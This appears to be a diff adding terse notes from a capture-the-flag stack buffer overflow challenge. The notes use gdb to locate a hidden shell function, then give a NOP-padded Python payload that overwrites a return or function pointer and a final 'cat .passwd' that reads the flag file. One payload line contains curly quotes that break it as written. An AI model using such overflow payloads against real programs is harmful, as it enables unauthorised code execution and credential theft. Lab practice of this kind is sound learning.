@@ -1,0 +1,20 @@
+gdb ch15
+disas shell
+ex : 0x08048464
+
+mkdir /tmp/elivet/
+touch /tmp/elivet/file
+python -c 'print("\x90"*128 + "ABCDEFGHIJKLMNOPQRSTUVWXYZ" + "\x64\x84\x04\x08”)’ > /tmp/elivet/file
+
+gdb ch15
+disas main
+ex:  0x080484bb <+47>:	call   0x8048360 <fgets@plt>
+break *0x080484bb
+run < /tmp/elivet/file
+next
+ex: EAX:0x44434241
+--> DCBA
+Quit
+
+(python -c 'print("\x90"*128 +  "\x64\x84\x04\x08")'  && cat) | ./ch15
+cat .passwd 
